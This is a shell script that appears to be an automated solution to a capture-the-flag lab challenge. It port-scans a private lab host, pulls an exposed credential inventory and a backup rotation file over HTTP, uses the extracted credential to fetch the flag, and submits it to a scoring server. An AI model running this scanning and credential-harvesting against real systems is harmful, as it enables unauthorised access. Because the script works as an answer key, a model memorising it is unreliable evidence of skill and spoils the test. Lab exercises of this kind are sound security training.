#!/bin/sh
set -eu
HOST=172.20.0.141
ID=scl-challenge-frame-ba28c1
nmap -n -p 8080 "$HOST"
ROOT=$(curl -fsS "http://$HOST:8080/")
INVENTORY=$(curl -fsS "http://$HOST:8080/share/index.json")
ROTATION=$(curl -fsS "http://$HOST:8080/backup/rotation.ini")
CREDENTIAL=$(printf '%s\n%s\n' "$INVENTORY" "$ROTATION" | python3 -c 'import json,re,sys; data=json.loads(sys.stdin.readline()); rotation=sys.stdin.read(); match=re.search(r"^active_credential=(.+)$", rotation, re.M); assert match; active=match.group(1).strip(); assert any(item["credential"] == active for item in data["credentials"]); print(active)')
RESPONSE=$(curl -fsS "http://$HOST:8080/archive?credential=$CREDENTIAL")
FLAG=$(printf '%s' "$RESPONSE" | python3 -c 'import json,sys; print(json.load(sys.stdin)["flag"])')
PAYLOAD=$(FLAG_VALUE="$FLAG" CHALLENGE_ID="$ID" python3 -c 'import json,os; print(json.dumps({"challenge_id":os.environ["CHALLENGE_ID"],"task_id":"task1","flag":os.environ["FLAG_VALUE"]}))')
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$PAYLOAD"
printf '\n'
